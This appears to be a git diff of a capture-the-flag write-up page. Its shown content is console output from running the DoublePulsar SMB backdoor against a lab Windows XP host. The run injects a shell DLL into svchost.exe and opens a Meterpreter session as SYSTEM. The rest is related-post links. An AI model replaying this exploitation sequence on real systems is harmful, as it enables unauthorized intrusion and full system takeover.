+</span><span class="err"></span><span class="go">[*] Applying Session Parameters
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[!] Enter Prompt Mode :: Doublepulsar
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Module: Doublepulsar
+</span><span class="go">====================
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Name              Value                                                 
+</span><span class="go">----              -----                                                 
+</span><span class="go">NetworkTimeout    60                                                    
+</span><span class="go">TargetIp          10.10.10.4                                            
+</span><span class="go">TargetPort        445                                                   
+</span><span class="go">OutputFile                                                              
+</span><span class="go">Protocol          SMB                                                   
+</span><span class="go">Architecture      x86                                                   
+</span><span class="go">Function          OutputInstall                                         
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[!] Plugin Variables are NOT Valid
+</span><span class="go">[?] Prompt For Variable Settings? [Yes] : 
+</span><span class="go">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds).  Use -1 for no timeout.
+</span><span class="go">[?] NetworkTimeout [60] : 
+</span><span class="go">[*]  TargetIp :: Target IP Address
+</span><span class="go">[?] TargetIp [10.10.10.4] : 
+</span><span class="go">[*]  TargetPort :: Port used by the Double Pulsar back door
+</span><span class="go">[?] TargetPort [445] : 
+</span><span class="go">[*]  Protocol :: Protocol for the backdoor to speak
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">*-&gt; 0) SMB     Ring 0 SMB (TCP 445) backdoor
+</span><span class="go">    1) RDP     Ring 0 RDP (TCP 3389) backdoor
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Protocol [0] : 
+</span><span class="go">[*]  Architecture :: Architecture of the target OS
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">*-&gt; 0) x86     x86 32-bits
+</span><span class="go">    1) x64     x64 64-bits
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Architecture [0] : 
+</span><span class="go">[*]  Function :: Operation for backdoor to perform
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">    0) OutputInstall     Only output the install shellcode to a binary file on disk.
+</span><span class="go">    1) Ping              Test for presence of backdoor
+</span><span class="go">*-&gt; 2) RunDLL            Use an APC to inject a DLL into a user mode process.
+</span><span class="go">    3) RunShellcode      Run raw shellcode
+</span><span class="go">    4) Uninstall         Remove&#39;s backdoor from system
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[?] Function [0] : 2
+</span><span class="go">[+] Set Function =&gt; RunDLL
+</span><span class="go">[*]  DllPayload :: DLL to inject into user mode
+</span><span class="go">[?] DllPayload [] : 
+</span><span class="go">[*]  DllPayload :: DLL to inject into user mode
+</span><span class="go">[?] DllPayload [] : C:\shell.dll
+</span><span class="go">[+] Set DllPayload =&gt; C:\shell.dll
+</span><span class="go">[*]  DllOrdinal :: The exported ordinal number of the DLL being injected to call
+</span><span class="go">[?] DllOrdinal [1] : 
+</span><span class="go">[*]  ProcessName :: Name of process to inject into
+</span><span class="go">[?] ProcessName [lsass.exe] : svchost.exe    
+</span><span class="go">[+] Set ProcessName =&gt; svchost.exe
+</span><span class="go">[*]  ProcessCommandLine :: Command line of process to inject into
+</span><span class="go">[?] ProcessCommandLine [] : 
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[!] Preparing to Execute Doublepulsar
+</span><span class="go">[*] Redirection OFF
+</span><span class="go">[+] Configure Plugin Local Tunnels
+</span><span class="go">[+] Local Tunnel - local-tunnel-1
+</span><span class="go">[?] Destination IP [10.10.10.4] : 
+</span><span class="go">[?] Destination Port [445] : 
+</span><span class="go">[+] (TCP) Local 10.10.10.4:445
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[+] Configure Plugin Remote Tunnels
+</span></code></pre></div></div>
 
 <p>These are our final settings for DoublePulsar:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">Module: Doublepulsar
-====================
-
-Name                  Value                                                 
-----                  -----                                                 
-NetworkTimeout        60                                                    
-TargetIp              10.10.10.4                                            
-TargetPort            445                                                   
-DllPayload            C:\shell.dll                                          
-DllOrdinal            1                                                     
-ProcessName           svchost.exe                                           
-ProcessCommandLine                                                          
-Protocol              SMB                                                   
-Architecture          x86                                                   
-Function              RunDLL</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">Module: Doublepulsar
+</span><span class="go">====================
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">Name                  Value                                                 
+</span><span class="go">----                  -----                                                 
+</span><span class="go">NetworkTimeout        60                                                    
+</span><span class="go">TargetIp              10.10.10.4                                            
+</span><span class="go">TargetPort            445                                                   
+</span><span class="go">DllPayload            C:\shell.dll                                          
+</span><span class="go">DllOrdinal            1                                                     
+</span><span class="go">ProcessName           svchost.exe                                           
+</span><span class="go">ProcessCommandLine                                                          
+</span><span class="go">Protocol              SMB                                                   
+</span><span class="go">Architecture          x86                                                   
+</span><span class="go">Function              RunDLL
+</span></code></pre></div></div></p>
 
 <p><strong>It&rsquo;s important to change the ProcessName from lsass.exe to svchost.exe !!!</strong>  Now, let&rsquo;s execute it:
-<div class="bg-black"><pre><code class="language-console" data-lang="console">[?] Execute Plugin? [Yes] : 
-[*] Executing Plugin
-[+] Selected Protocol SMB
-[.] Connecting to target...
-[+] Connected to target, pinging backdoor...
-    [+] Backdoor returned code: 10 - Success!
-    [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x00811F87
-    SMB Connection string is: Windows 5.1
-    Target OS is: XP x86
-    [+] Backdoor installed
-    [+] DLL built
-    [.] Sending shellcode to inject DLL
-    [+] Backdoor returned code: 10 - Success!
-    [+] Backdoor returned code: 10 - Success!
-    [+] Backdoor returned code: 10 - Success!
-    [+] Command completed successfully
-[+] Doublepulsar Succeeded
-Back to metasploit:
-
-[*] Sending stage (179267 bytes) to 10.10.10.4
-[*] Meterpreter session 1 opened
-
-meterpreter &gt; getuid
-Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">[?] Execute Plugin? [Yes] : 
+</span><span class="go">[*] Executing Plugin
+</span><span class="go">[+] Selected Protocol SMB
+</span><span class="go">[.] Connecting to target...
+</span><span class="go">[+] Connected to target, pinging backdoor...
+</span><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span><span class="go">    [+] Ping returned Target architecture: x86 (32-bit) - XOR Key: 0x00811F87
+</span><span class="go">    SMB Connection string is: Windows 5.1
+</span><span class="go">    Target OS is: XP x86
+</span><span class="go">    [+] Backdoor installed
+</span><span class="go">    [+] DLL built
+</span><span class="go">    [.] Sending shellcode to inject DLL
+</span><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span><span class="go">    [+] Backdoor returned code: 10 - Success!
+</span><span class="go">    [+] Command completed successfully
+</span><span class="go">[+] Doublepulsar Succeeded
+</span><span class="go">Back to metasploit:
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">[*] Sending stage (179267 bytes) to 10.10.10.4
+</span><span class="go">[*] Meterpreter session 1 opened
+</span><span class="go"></span><span class="err">
+</span><span class="err"></span><span class="go">meterpreter &gt; getuid
+</span><span class="go">Server username: NT AUTHORITY\SYSTEM :D
+</span></code></pre></div></div></p>
 
         </div>
 
@@ -713,6 +727,190 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
           
           
           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
@@ -777,109 +975,21 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Sense write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">24 Mar 2018</time>
-      <time lang="el">24 Μαρ 2018</time>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -921,46 +1031,6 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -984,214 +1054,6 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
           
            
            
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Enterprise write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Mar 2018</time>
-      <time lang="el">19 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Mantis write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">18 Feb 2018</time>
-      <time lang="el">18 Φεβ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -1233,17 +1095,65 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
     </footer>
   </a>
 </article>
@@ -1265,17 +1175,21 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1349,21 +1263,13 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1420,6 +1326,22 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
           
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1557,17 +1479,21 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
     </footer>
   </a>
 </article>
@@ -1605,17 +1531,41 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
     </footer>
   </a>
 </article>
@@ -1642,6 +1592,127 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
           
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
@@ -1783,56 +1854,6 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
     <div class="cell">
@@ -1864,22 +1885,6 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
           
            
            
@@ -1919,37 +1924,6 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/winrm.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">WinRM shell (a.k.a. PowerShell Remoting) with file upload capability</h3>
-      <h3 class="title" lang="el">WinRM κέλυφος (PowerShell Remoting) με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Apr 2018</time>
-      <time lang="el">09 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
            
           
            
@@ -2032,220 +2006,20 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
     </footer>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
@@ -2492,6 +2266,273 @@ Server username: NT AUTHORITY\SYSTEM :D</code></pre></div></p>
            
            
            
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/winrm_shell/" class="clearfix">
+    <div class="cell">
